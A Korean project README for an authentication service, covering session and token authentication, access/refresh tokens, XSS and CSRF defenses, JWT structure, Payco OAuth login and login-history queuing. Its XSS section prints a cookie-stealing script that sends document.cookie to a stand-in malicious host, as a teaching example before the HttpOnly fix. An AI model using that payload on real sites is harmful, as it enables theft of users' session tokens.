# 1. 인증 방식
- 세션 & 쿠키 인증방식
- 토큰 인증 방식

## 1.1 세션 & 쿠키 인증 방식

### (Session Base Architecture)

![](./img/SingleSessionArchitecture.png)

- 인증 절차
1. 사용자가 로그인을 하게됩니다.
2. 인증서버는 유저 서버에 로그인한 회원 정보를 받아 옵니다.
3. 해당 정보가 일치한다면 Session을 생성하고 해당 Session의 ID를 반환합니다.
4. 받은 Session ID를 쿠키에 저장하고 인가가 필요한 요청 마다 쿠키를 요청에 담아 인증 서버로 보냅니다.
5.  받은 Session ID와 매칭 되는 Session이 있으면 해당 필요한 요청을 수행 할 수 있습니다.

해당 방식의 경우 트래픽이 많아지면 Session을 저장하는서비스에 큰 부하가 걸리게 됩니다.  

이때, 해결책으로는 Scale-Up, Scale-Out 방식이 존재합니다.

Scale-up의 할 경우 구성 및 관리가 편하다는 장점이 있지만 하드웨어의 성능에는 한계가 있기 때문에 확장성에 한계가 발생하게 되며 서버를 업그레이드하는 과정에 서버가 다운된다는 단점이 있습니다.

반면 Scale-out의 경우 확장성이 크며 기존의 서버를 두고 확장이 가능하지만 구성 및 관리가 힘들다는 단점이 있습니다.

Scale-up을 하여 해당 인증/인가 시스템을 개선한다면 해당 시스템에 큰 문제가 발생하지 않지만 Scale-out을 하게된다면 시스템에 문제가 발생합니다.

![](./img/MultiSessionArchitecture.png)

인증 서버를 늘이게 될 경우 어떤 유저의 정보가 어디에 있는지 알 수 없음으로 동기화를 해주는 과정이 필요하게 되며 이는 상당히 복잡한 구성이 될 수 있습니다.

또한 다른 방법으로는 한 유저를 한 서버롤 매칭 시키는 방법이 존재합니다.
이렇게 되면 요청을 응답해야하는 서버가 어딘가에는 저장되어야하는 낭비가 발생하며 한 서버에 트래픽이 몰릴 수 있다는 단점이 있습니다.

또, 다른 방법으로는 Session을 공유하는 방법이 있습니다.

![](./img/sharedSessionArchitecture.png)

이렇게 되면 부하를 분산 할 수 있다는 단점을 극복 할 수 있지만 결국 공유되는 Session을 감당하는 DB는 모든 부하를 감당해야한다는 단점이 있습니다.


## 1.2 토큰 인증 방식

### (Token Base Architecture)

![](./img/SingleSessionArchitecture.png)

- 인증 절차
1. 사용자가 로그인을 하게됩니다.
2. 인증서버는 유저 서버에 로그인한 회원 정보를 받아 옵니다.
3. 해당 정보가 일치한다면 Token을 발행합니다.
4. 받은 Token을 쿠키에 저장하고 인가가 필요한 요청 마다 쿠키를 요청에 담아 요청지로 보냅니다.
5.  Gateway는 해당 토큰이 유효하다면 인가를 한 후 해당 요청을 수행합니다.

해당 방식은 Session과 다르게 인증정보를 유저가 가지고 있기 때문에 인증서버나 별도의 저장소를 한번더 안거친다는 장점이 있습니다.

그러므로 트래픽이 몰려도 처리가 용의합니다.

하지만 토큰만이 가지는 단점 또한, 존재합니다.

1. 관리적 측면 : 서버는 해당 유저의 정보를 따로 저장하고 있지 않기 때문에 어떤 유저가 현재 로그인해 있는지 관리 할 수 없습니다.
2. 보안적 측면 : 토큰은 인증/인가의 정보를 모두 가지고 있기 때문에 해당 토큰이 탈취후 사용하게된다면 유저와 동일하게 사용 할 수 있습니다.

이러한 단점들을 보안 하기 위하여 Access와 Refresh토큰을 분리하여 사용합니다.

Access토큰은 인가를 받을 수 있는 토큰이며 Refresh 토큰은 Access토큰을 재발급 해주는 토큰입니다.  
보안적 측면의 단점을 보안하기위하여 Access토큰은 비교적 짧은 시간의 만료기간을 가지게됩니다.  
이렇게 하여 해당 토큰을 탈취하여도 몇분 밖에 접근권한을 가지지 못합니다.  
이 짧은 만료시간을 보안하기위하여 Refresh토큰은 비교적 긴 만료시간을 가지게 되고 Access토큰이 만료되면 재발급해줍니다.  

이때 Refresh 토큰 또한 탈취를 당할 수 있게 때문에 Access를 발급하며 해당 Refresh토큰 또한 재발급하며 이때 관리적인 측면을 보안하기 위하여 해당 Refresh토큰을 별도로 저장해 둡니다.  
이렇게 하므로써 Refresh 토큰을 탈취하여 재발급을 받으려하여도 저장된 Refresh가 아니라면 재발급을 불가능 하게 할 수 있습니다.

![](./img/AccessRefreshArchitecture.png)

#### 토큰 탈취 및 공격 방식

토큰을 탈취 및 공격하는 방식은 대표적으로 2가지로 볼 수 있습니다.
XSS, CSRF의 방식이 있습니다.

##### XSS
 XSS 공격 기법은 보안이 취약한 웹 사이트에 악의적인 스크립트를 넣어놓고 사용자가 이 스크립트를 강제로 실행하게 끔 유도하여 사용자의 액세스 토큰을 탈취하는 기법입니다. 
 
 예를들어 리뷰 글에 아래와 같은 스크립트를 넣고 누르게 한다면 메시지 창이 나오게 됩니다.
 
 ```js
<a href="javascript:alert('hello world')">클릭해보세요!</a>
```

위 기법으로 아래와 같은 코드를 넣으면 어떻게 될까?

```js
<script>document.location='http://악성-사이트.com/cookie?'+document.cookie</script>
```

위의 스크립트를 실행하게되면 사용자가 가지고 있는 쿠기나 로컬 스토리지에 접근이 가능합니다.
해당 정보들에서 액세스 토큰을 탈취하여 서버로 전송하게 되면 사용자의 정보가 탈취당할 수 있습니다.

이를 해결하는 방안으로는 `Set-Cookie`의 `HttpOnly`옵션을 거는 방법이 있습니다.

```java
Cookie cookie = new Cookie("access", 토큰);  
cookie.setHttpOnly(true);  
cookie.setSecure(true);  
cookie.setPath("/");  
cookie.setMaxAge(만료시간);  
response.addCookie(cookie);
```

`HTTPOnly` 속성을 추가하여 쿠키를 설정하면, 브라우저는 이 쿠키를 클라이언트 측 스크립트에서 접근할 수 없도록 합니다.  
해당 설정은 Access 뿐만 아니라 Refresh에도 필수적인 요소입니다.  

또한 위의 `Secure`옵션을 추가하여 HTTPS환경에서만 사용 할 수 있도록 설정도 해주어야합니다.

##### CSRF(cross site request forgery attack)
CSRF공격은 토큰을 탈취하는 방식이 아닌 토큰을 가진 유저가 특정행위를 하도록 유도하여 공격하는 방식입니다.

###### CSRF 공격의 동작 원리

1. **사용자가 로그인**: 피해자가 은행 웹사이트나 소셜 미디어 플랫폼 등에서 로그인합니다. 이때, 브라우저는 해당 도메인에 대한 세션 쿠키를 저장합니다.
    
2. **악의적인 사이트 방문**: 공격자는 악의적인 웹페이지나 이메일을 통해 사용자를 유도하여 특정 페이지를 방문하게 합니다.
    
3. **자동 요청 전송**: 피해자가 악의적인 페이지를 방문하면, 해당 페이지에 포함된 악성 스크립트가 피해자가 로그인한 상태로 특정 웹 애플리케이션 서버에 요청을 보냅니다. 이 요청에는 사용자의 인증 쿠키가 자동으로 포함됩니다.
    
4. **서버 요청 처리**: 서버는 요청이 피해자의 세션을 통해 이루어진 것이므로 이를 신뢰하고 요청을 처리합니다. 이로 인해 사용자의 계정에서 비정상적인 동작이 수행될 수 있습니다.

해당 공격을 막기위서는 다음과 같은 추가적인 보안 조치를 고려할 수 있습니다.

1. CSRF 토큰 사용: 각 요청 마다 고유한 토큰을 포함시킵니다.
	- 해당 방법의 겨우 서버에서 고유한 토큰을 발급하여 일치여부를 판단합니다.
	- 해당 토큰을 저장할 세션 또는 별도의 저장소를 필요로합니다.
	- 해당 방법의 경우 Statelessness의 이점을 위해 토큰인증을 도입한 경우 다시 세션인증과 동일한 문제를 직면할 수 있습니다.
2. SameSite 쿠키 속성 : 동일한 url이 아닌 경우 쿠키의 전송을 제한합니다.
3. Origin 헤더 검증 : 서버에서 요청의 출처를 검증합니다.
4. Referer 헤더 검증 : 요청의 이전 페이지 URL을 확인합니다.

 이번의 해당 프로젝트에서는 트래픽을 고려한 설계를 하였기 때문에 SameSite 쿠키 속성을 활용하여 보안을 강화하는 방법을 채택하였습니다.

### Access 재발급

 Access 토큰은 짧은 만료기간을 가지고 있기 때문에 재발글을 해주는 로직이 필요합니다.
이를 위하여 여러방안을 시도해 보고 해당 방안의 단점을 보안하여 최종 로직을 구현하였습니다.

1. 최초 도입한 방안으로 Front에서 요청을 보낼때 Access가 만료되면 재발급을 요청하여 재발급을 받는 방식입니다.
	- 해당 방식의 경우 검사할때에는 유효하였으나 gateway로 넘어가는 순간 만료되었을 겨우 error가 발생합니다.
2. 위의 문제를 해결한 방안으로 gateway로 무조건 보내고 gateway에서 토큰만료 Exception을 주면 그때 재발급을 수행 하는 방식입니다.
	- 해당 방식의 경우 Access가 만료되었을 시 gateway를 한번 갔다 와야하는 트래픽 1번이 늘어나게 된다는 단점이 있습니다.
3. 1번 방안과 2번 방안을 섞어서 도입하는 방식입니다.
	- 해당 방식의 경우 트래픽이 늘어나게되는 경우가 현저하게 줄게되지만 여전히 존재하긴 합니다.
4. 마지막 최종방안으로 1번 방식에서 만료기준을 5초 전으로 잡아서 검사를 진행합니다.
	- 이렇게 진행하면 만료기간이 5초가 남아도 만료로 보기 때문에 gateway에서 만료로 인한 Error가 발생하는 일은 거의 없게 됩니다.

# 2. JWT

 그럼 토큰기반 인증에 대하여 알아 보았으니 토큰기반 인증에서 주로 사용되는 JWT에 대하여 알아보도록 하겠습니다.
JWT는 Json Web Token의 약자로 말 그대로 Json형태의 Web에서 사용되는 토큰을 의미합니다.

## JWT의 구조

JWT는 `.`를 기준으로 3파트로 구분 됩니다.
`HEADER.PAYLOAD.SIGNATURE`로 구분이 되며 Base64로 인코딩 되어 아래와 같은 형태가 보이게 됩니다.

```JWT
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

예시의 JWT는 아래의 내용을 가집니다.

### Header
ALGORITHM & TOKEN TYPE

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Header에서는 해시 알고리즘과 토큰의 타입을 정의할 수 있습니다.
예시의 HS256은 HMAC SHA 256을 의미합니다.
해시 알고리즘 중 한 가지입니다.
타입의 값은 JWT는 해당 토큰을 JWT로 지정합니다.
### PAYLOAD
DATA

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
```

Payload는 데이터를 정의 할 수 있습니다.
데이터는 각각의 Key를 Claim이라고 부릅니다.
claim은 json과 동일하게 key와 value로 구성이 가능합니다.'
claim에는 registered, public, private의 종류를 가집니다.
#### registered claim
다음은 서비스에 대한 정보가 아닌, 토큰에 대한 정보를 담기위한 클레임들입니다.  
모두 사용하는것은 아니고 선택적으로 사용됩니다.

- iss (Issuer): 토큰을 발급한 발급자(issuer)의 식별자를 지정합니다.
- sub (Subject): 토큰의 주제(subject)로 토큰이 어떤 대상을 나타내는지 지정합니다.
- aud (Audience): 토큰의 대상(audience)으로 토큰을 받을 수신자를 지정합니다.
- exp (Expiration Time): 토큰의 만료 시간을 지정합니다.
- nbf (Not Before): 토큰의 유효 시작 시간을 지정합니다. 이 날짜 전에는 토큰이 처리되지 않습니다.
- iat (Issued At): 토큰이 발급된 시간을 지정합니다.
- jti (JWT ID): 토큰의 고유 식별자를 지정합니다.

그 외의 클레임 종류 : [https://datatracker.ietf.org/doc/html/rfc7519#section-4.1](https://datatracker.ietf.org/doc/html/rfc7519#section-4.1)

#### Public Claims (공개 클레임)

공개 클레임이란 사용자 정의 클레임으로 공개용 정보를 위해 사용되며 충돌 방지를 위해 URI 포맷 또는 UUID를 사용해서 만듭니다.

```json
{
  "https://book-store.shop" : true
}
```

#### Private Claims (비공개 클레임)

공개 클레임과 마찬가지로 사용자 정의 클레임으로 서버와 클라이언트 사이에 협의한 데이터를 저장합니다.
Private이라는 명칭으로 정의되어 있기는 하지만 jwt특성상 누구나 decoding하여 내용을 볼 수 있기 때문에 공개가능한 정보만을 넣는 것을 권장합니다.

```json
{
  "name": "John Doe",
  "email": "john.doe@example.com",
  "role": "user"
}
```


### SIGNATURE

```null
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
```

서명 파트는 위와 같이 Base64 인코딩된 **Header** **"."** **Payload** 그리고 **secret**이 필요합니다.  
secret은 말 그대로 유저가 지정하는 비밀 코드입니다.  
위와 같이 해싱하면 서명이 완성됩니다.

# 3. OAuth

 많은 플랫폼에서 SSO를 진행합니다.
이로인하여 해당 프로젝트에서도 Payco의 SSO를 이용하여 인증 인가를 진행 할 수 있도록 서비스를 구축해 보았습니다.

방식은 아래와 같은 방식으로 구현해 보았습니다.
![](./img/OAuth.jpg)

1. Web에서 사용자는 로그인을 요청하게 되고 web 서버에서는 Payco 쪽으로 로그인 web을 요청합니다.
2. Payco 측에서 로그인 View를 제공해줍니다.
3. 사용자가 로그인하여 접속하게되면 Payco 측에서는 Redirect URL로 Authorization Code를 제공합니다.
4. Web서버는 받은 코드를 인증 서버로 던저줍니다.
5. 인증서버는 받은 코드를 통하여 Payco의 api에 access 토큰을 요청하고 해당 토큰을 이용하여 사용자 정보를 받아 옵니다.

받은 정보를 통하여 회원은 간편 회원가입을 하게되고 이후 해당 사이트의 서비스를 회원과 같이 사용 할 수 있게 됩니다.

# 4. 로그인 History 관리

 해당 프로젝트에서는 Login의 History를 관리합니다.
또한 해당 프로젝트 에서 인증의 경우 인증 서버가 따로 처리를 하지만 회원의 정보는 따로 관리하는 서버스에서 관리하게 됩니다.

이때 회원 서비스의 api를 이용하여 로그인 기록갱신을 시도할 때, 일반적인 http통신의 동기적인 통신이 아닌 통보방식의 비동기 통신이라 Message Queue를 도입하여 응답받는 시간을 단축하는 방식을 채택하였습니다.

인증서버는 회원의 로그인 정보를 Message화 하여 Message Queue에 넣고 바로 토큰을 발급해 주게됩니다.

# Auth Service Project
[https://github.com/nhnacademy-be6-code-quest/service-auth](https://github.com/nhnacademy-be6-code-quest/service-auth)
